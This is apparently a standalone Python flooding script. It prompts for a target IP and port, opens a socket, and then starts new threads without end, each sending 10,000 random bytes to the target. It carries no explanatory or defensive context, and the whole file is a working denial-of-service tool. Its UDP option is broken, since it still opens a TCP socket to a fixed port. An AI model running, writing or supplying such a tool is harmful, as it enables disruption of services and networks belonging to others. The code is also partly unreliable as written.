from datetime import datetime
import threading
import socket
import random
import time


def establish_connection():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_ip = input("IP: ")
            protocol = input("TCP/UDP: ").upper()

            if protocol == "TCP":
                server_port = int(input("Port: "))
            else:
                server_port = 65535

            data = random.randbytes(10000)
            client_socket.connect((server_ip, server_port))
            print(f"Connected to {server_ip}:{server_port}")
            return client_socket, data
        except Exception as e:
            print(f"Error: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)


client_socket, data = establish_connection()


def send():
    current_time = datetime.now().strftime("%H:%M:%S")
    try:
        client_socket.sendall(data)
        print(f"\033[32m[+]\033[0m {current_time}")
    except:
        print(f"\033[41m[-]\033[0m {current_time}")


while True:
    send_thread = threading.Thread(target=send)
    send_thread.start()
